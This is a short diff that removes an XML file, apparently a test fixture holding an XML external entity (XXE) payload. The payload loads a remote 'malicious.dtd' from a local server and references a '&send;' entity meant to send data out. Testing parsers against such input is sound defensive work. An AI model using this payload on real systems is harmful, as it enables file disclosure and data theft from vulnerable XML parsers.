@@ -1,8 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-    <!ENTITY % remote SYSTEM "http://localhost:8000/malicious.dtd">
-    %remote;
-]>
-<foo>
-    <bar>&send;</bar>
-</foo>
